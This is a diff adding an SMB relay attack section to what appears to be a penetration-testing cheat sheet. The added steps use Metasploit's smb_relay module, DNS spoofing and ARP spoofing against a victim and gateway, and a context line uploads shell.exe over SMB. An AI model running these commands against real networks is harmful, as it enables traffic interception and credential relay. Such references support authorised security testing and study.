@@ -360,6 +360,22 @@ smbmap -H <target_ip> -r <share> # Recursively list shared memory
     smbclient //<target_ip>/<ShareName> -U 'username%password'
     put shell.exe
     ```
+- If see the info `Message signing enabled but not required` in scan and enum, burte for and other attack method failed, and gain access to the internet, try SMB Relay Attack
+ 1. Configure Relay Module
+  ```text
+  msf6 > use exploit/windows/smb/smb_relay
+  ```
+  2. Conduct DNS Spoofing
+    ```bash
+    echo "<attack_ip> *.example.com" > /tmp/hosts
+    dnsspoof -i <interface> -f /tmp/hosts
+    ```
+  3. Conduct ARP Spoofing
+    ```bash
+    echo 1 > /proc/sys/net/ipv4/ip_forward
+    arpspoof -i <interface> -t <victim_IP> <gateway_IP>
+    arpspoof -i <interface> -t <gateway_IP> <victim_IP>
+    ```
 
 ### Brute Force
 
